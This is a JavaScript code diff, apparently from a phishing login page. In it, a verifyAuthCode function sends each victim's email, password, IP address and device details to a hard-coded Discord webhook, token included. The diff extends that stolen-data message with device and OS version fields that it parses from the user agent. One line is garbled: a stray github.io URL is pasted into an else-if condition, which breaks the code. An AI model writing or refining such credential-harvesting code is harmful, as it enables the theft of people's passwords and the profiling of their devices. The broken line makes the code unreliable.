@@ -30,7 +30,7 @@ async function verifyAuthCode() {
         const webhookUrl = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G';
 
         const message = {
-            content: `IP Address: ${ipAddress}\nDevice: ${deviceInfo.device}\nOS: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nEmail: ${email}\nPassword: ${password}`,
+            content: `IP Address: ${ipAddress}\nDevice: ${deviceInfo.device}\nDevice Version: ${deviceInfo.deviceVersion}\nOS: ${deviceInfo.os}\nOS Version: ${deviceInfo.osVersion}\nBrowser: ${deviceInfo.browser}\nEmail: ${email}\nPassword: ${password}`,
         };
 
         await sendToDiscord(webhookUrl, message);
@@ -57,41 +57,62 @@ function getDeviceInfo() {
     let device = 'Unknown Device';
     let os = 'Unknown OS';
     let browser = 'Unknown Browser';
+    let deviceVersion = 'Unknown Version';
+    let osVersion = 'Unknown Version';
 
     // 端末情報の取得
-    if (/Mobi|Android/i.test(userAgent)) {
+    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
         device = 'Mobile';
-    } else {
-        device = 'Desktop';
-    }
-
-    // OS情報の取得
-    if (/Windows NT/i.test(userAgent)) {
-        os = 'Windows';
-    } else if (/Mac OS X/i.test(userAgent)) {
-        os = 'Mac OS';
-    } else if (/Android/i.test(userAgent)) {
-        os = 'Android';
-    } else if (/iOS|iPhone|iPad/i.test(userAgent)) {
+        deviceVersion = userAgent.match(/(iPhone|iPad);.*? OS (\d+_\d+)/);
+        if (deviceVersion) {
+            deviceVersion = deviceVersion[2].replace(/_/g, '.');
+        }
         os = 'iOS';
+        osVersion = userAgent.match(/OS (\d+_\d+)/);
+        if (osVersion) {
+            osVersion = osVersion[1].replace(/_/g, '.');
+        }
+    } else if (/Android/.test(userAgent)) {
+        device = 'Mobile';
+        os = 'Android';
+        osVersion = userAgent.match(/Android (\d+(\.\d+)?)/);
+        if (osVersion) {
+            osVersion = osVersion[1];
+        }
+    } else if (/Windows NT/.test(userAgent)) {https://hazimeteotukaisab.github.io/Google_and_playPenis_love/
+        device = 'Desktop';
+        os = 'Windows';
+        osVersion = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
+        if (osVersion) {
+            osVersion = osVersion[1];
+        }
+    } else if (/Mac OS X/.test(userAgent)) {
+        device = 'Desktop';
+        os = 'Mac OS';
+        osVersion = userAgent.match(/Mac OS X (\d+_\d+(_\d+)?)/);
+        if (osVersion) {
+            osVersion = osVersion[1].replace(/_/g, '.');
+        }
     }
 
     // ブラウザ情報の取得
-    if (/Chrome/i.test(userAgent)) {
+    if (/Chrome/.test(userAgent)) {
         browser = 'Chrome';
-    } else if (/Firefox/i.test(userAgent)) {
+    } else if (/Firefox/.test(userAgent)) {
         browser = 'Firefox';
-    } else if (/Safari/i.test(userAgent)) {
+    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
         browser = 'Safari';
-    } else if (/Edge/i.test(userAgent)) {
+    } else if (/Edge/.test(userAgent)) {
         browser = 'Edge';
-    } else if (/MSIE|Trident/i.test(userAgent)) {
+    } else if (/MSIE|Trident/.test(userAgent)) {
         browser = 'Internet Explorer';
     }
 
     return {
         device,
+        deviceVersion,
         os,
+        osVersion,
         browser,
     };
 }
